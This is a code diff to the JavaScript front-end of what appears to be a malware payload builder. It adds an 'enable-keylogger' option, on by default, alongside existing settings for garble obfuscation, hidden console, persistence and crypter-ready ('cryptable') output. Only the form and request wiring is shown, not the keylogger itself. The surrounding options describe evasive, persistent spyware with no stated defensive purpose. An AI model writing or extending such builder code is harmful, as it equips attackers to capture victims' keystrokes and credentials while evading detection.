@@ -125,6 +125,7 @@ function collectFormSettings() {
     stripDebug: document.querySelector('input[name="strip-debug"]')?.checked ?? true,
     disableCgo: document.querySelector('input[name="disable-cgo"]')?.checked ?? false,
     noPrinting: document.querySelector('input[name="no-printing"]')?.checked ?? false,
+    enableKeylogger: document.querySelector('input[name="enable-keylogger"]')?.checked ?? true,
     obfuscate: document.querySelector('input[name="obfuscate"]')?.checked ?? false,
     garbleLiterals: document.querySelector('input[name="garble-literals"]')?.checked ?? false,
     garbleTiny: document.querySelector('input[name="garble-tiny"]')?.checked ?? false,
@@ -178,6 +179,7 @@ function applyFormSettings(settings) {
   if (settings.stripDebug !== undefined) setCb('input[name="strip-debug"]', settings.stripDebug);
   if (settings.disableCgo !== undefined) setCb('input[name="disable-cgo"]', settings.disableCgo);
   if (settings.noPrinting !== undefined) setCb('input[name="no-printing"]', settings.noPrinting);
+  if (settings.enableKeylogger !== undefined) setCb('input[name="enable-keylogger"]', settings.enableKeylogger);
   if (settings.obfuscate !== undefined) setCb('input[name="obfuscate"]', settings.obfuscate);
   if (settings.garbleLiterals !== undefined) setCb('input[name="garble-literals"]', settings.garbleLiterals);
   if (settings.garbleTiny !== undefined) setCb('input[name="garble-tiny"]', settings.garbleTiny);
@@ -390,7 +392,7 @@ const CRYPTABLE_DISABLE_INPUTS = [
   "#sleep-seconds",
 ];
 
-const CRYPTABLE_HIDE_SECTIONS = [4, 5, 6];
+const CRYPTABLE_HIDE_SECTIONS = [5, 6, 7];
 
 function applyCryptableMode(enabled) {
   const badge = document.getElementById("cryptable-badge");
@@ -1342,6 +1344,7 @@ form?.addEventListener("submit", async (e) => {
   const noPrinting = form.querySelector(
     'input[name="no-printing"]',
   ).checked;
+  const enableKeylogger = form.querySelector('input[name="enable-keylogger"]')?.checked ?? true;
 
   const outputNameVal = form.querySelector("#output-name")?.value.trim() || "";
   const garbleLiterals = form.querySelector('input[name="garble-literals"]')?.checked || false;
@@ -1375,6 +1378,7 @@ form?.addEventListener("submit", async (e) => {
     startupName: enablePersistence && (hasWindowsTarget || hasPersistentUnixTarget) && startupNameVal ? startupNameVal : undefined,
     hideConsole,
     noPrinting,
+    disableKeylogger: !enableKeylogger,
     outputName: outputNameVal || undefined,
     garbleLiterals: obfuscate ? garbleLiterals : undefined,
     garbleTiny: obfuscate ? garbleTiny : undefined,
